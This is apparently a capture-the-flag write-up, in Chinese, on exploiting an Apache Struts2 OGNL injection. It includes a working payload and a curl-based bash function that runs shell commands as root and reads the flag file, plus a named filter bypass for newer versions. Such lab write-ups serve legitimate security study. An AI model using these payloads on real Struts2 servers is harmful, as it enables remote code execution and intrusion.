## 题解

### 入口与指纹

端口 **8080**，响应头是 Java 容器风格：

```http
Set-Cookie: JSESSIONID=0B9772F4DED0704C246BFC5B249B5260; Path=/; HttpOnly
Content-Language: en
```

页面标题 `Customer service contact form`，表单：

```html
<form id="sendMessageAction" name="sendMessageAction"
      action="/sendMessageAction.action;jsessionid=…" method="post">
  <textarea name="message" …></textarea>
</form>
```

**`.action` + `wwFormTable` 样式 = Apache Struts2**。这类「表单回显 message」
几乎必定是 OGNL 注入。

### 关键观察

**1. `message` 会被当作 OGNL 表达式求值。**

| 输入 | 页面回显 |
| --- | --- |
| `%{7*7}` | `49` |
| `${7*7}` | `49` |
| `#{7*7}` | （空） |

**2. 静态方法调用可用。**

```bash
message=%{@java.lang.System@getProperty("user.dir")}
# Your message: /usr/local/tomcat
```

说明没有 `SecurityMemberAccess` 拦截 `java.lang.*` 的静态方法。

**3. 用 `Scanner` 把命令输出读回页面。**

```bash
message=%{new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('id')
        .getInputStream()).useDelimiter('\\A').next()}
# Your message: uid=0(root) gid=0(root) groups=0(root)
```

`Runtime.exec` 单字符串会按空格切分，`id`、`ls /`、`cat /tmp/flag` 都能直接跑。

### 利用链

```bash
T=$(head -1 .target)
rce() {
  curl -sS -X POST \
    --data-urlencode "message=%{new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('$1').getInputStream()).useDelimiter('\\\\A').next()}" \
    "http://$T/sendMessageAction.action" \
  | sed -n '/Your message/,/<\/p>/p' | sed 's/<[^>]*>//g'
}

rce 'id'                          # uid=0(root)
rce 'ls /'
rce 'find / -maxdepth 3 -iname *flag*'   # /tmp/flag
rce 'cat /tmp/flag'
```

```text
flag{1bc99a6e-d9bd-4c38-8cc1-6d0dcc1d2f7e}
```

### flag 位置

容器内的 `/tmp/flag`（不在 web 根，需要 `find` 定位）。

## 复盘

- **`.action` 后缀 + `wwFormTable` = Struts2。** 看到这个组合先测 OGNL：
  `%{7*7}` / `${7*7}` 各发一次，回显 `49` 就确认。
- **Struts2 的 OGNL 注入按版本分两类**：
  - 老版本（无 `SecurityMemberAccess`）直接 `@java.lang.System@…` 即可；
  - 新版本需要 `#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS` 之类的绕过。
  本题 `@java.lang.System@getProperty` 直接可用，属于前者，省掉了绕过。
- **回显命令输出不一定需要反弹 shell。** `Runtime.exec` + `Scanner(...).useDelimiter('\\A')`
  把 stdout 读成字符串再回显，比搭回连通道简单得多，也不受出网限制。
- **`exec(String)` 按空格切分**，`cat /tmp/flag` 这种两步参数也能直接跑；
  参数里带空格再考虑 `exec(String[])`。
- **拿 shell 后先 `find`。** flag 在 `/tmp/flag`，`ls /` 看不到。
